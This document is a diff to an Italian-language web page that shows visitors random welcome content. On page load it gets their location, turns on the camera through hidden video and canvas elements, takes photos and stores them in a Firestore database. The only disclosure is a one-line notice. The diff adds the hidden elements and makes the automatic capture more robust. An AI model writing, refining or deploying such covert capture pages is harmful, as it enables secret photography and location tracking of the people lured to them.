@@ -7,6 +7,15 @@
     <!-- Includi Firebase -->
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js"></script>
+</head>
+<body>
+    <h1>Benvenuto!</h1>
+    <div id="content"></div>
+    <p id="privacy-notice">Questa pagina raccoglie posizione e foto. Continuando, accetti i nostri <a href="#">termini</a>.</p>
+    <div id="debug"></div>
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
     <script>
         // Configurazione Firebase
         const firebaseConfig = {
@@ -19,7 +28,7 @@
             measurementId: "G-E9MKECCY3W"
         };
 
-        // Inizializza Firebase e gestisci errori
+        // Inizializza Firebase
         let db;
         try {
             const firebaseApp = firebase.initializeApp(firebaseConfig);
@@ -33,6 +42,8 @@
         function logDebug(message) {
             if (debugDiv) {
                 debugDiv.innerHTML += `<p>${message}</p>`;
+            } else {
+                console.log("Debug div non trovato: " + message);
             }
         }
 
@@ -48,9 +59,13 @@
         // Mostra contenuto casuale
         function showRandomContent() {
             const contentDiv = document.getElementById('content');
-            const randomIndex = Math.floor(Math.random() * randomContents.length);
-            contentDiv.innerHTML = randomContents[randomIndex];
-            logDebug("Contenuto casuale mostrato");
+            if (contentDiv) {
+                const randomIndex = Math.floor(Math.random() * randomContents.length);
+                contentDiv.innerHTML = randomContents[randomIndex];
+                logDebug("Contenuto casuale mostrato");
+            } else {
+                logDebug("Content div non trovato");
+            }
         }
 
         // Ottieni posizione
@@ -77,16 +92,21 @@
         // Accedi alla fotocamera
         async function startCamera(facingMode) {
             const video = document.getElementById('video');
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode }
-                });
-                video.srcObject = stream;
-                logDebug(`Fotocamera ${facingMode} avviata`);
-                return stream;
-            } catch (err) {
-                logDebug("Errore fotocamera: " + err.message);
-                throw err;
+            if (video) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: facingMode }
+                    });
+                    video.srcObject = stream;
+                    logDebug(`Fotocamera ${facingMode} avviata`);
+                    return stream;
+                } catch (err) {
+                    logDebug("Errore fotocamera: " + err.message);
+                    throw err;
+                }
+            } else {
+                logDebug("Video element non trovato");
+                throw new Error("Video element non trovato");
             }
         }
 
@@ -94,18 +114,25 @@
         function takePhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const photo = canvas.toDataURL('image/jpeg');
-            logDebug("Foto scattata");
-            return photo;
+            if (video && canvas) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photo = canvas.toDataURL('image/jpeg');
+                logDebug("Foto scattata");
+                return photo;
+            } else {
+                logDebug("Video o canvas non trovato");
+                throw new Error("Video o canvas non trovato");
+            }
         }
 
         // Ferma fotocamera
         function stopCamera(stream) {
-            stream.getTracks().forEach(track => track.stop());
-            logDebug("Fotocamera fermata");
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                logDebug("Fotocamera fermata");
+            }
         }
 
         // Salva dati su Firestore
@@ -149,8 +176,8 @@
             }
         }
 
-        // Avvia automaticamente
-        window.onload = captureData;
+        // Avvia automaticamente quando il DOM è pronto
+        document.addEventListener('DOMContentLoaded', captureData);
     </script>
 </body>
 </html>
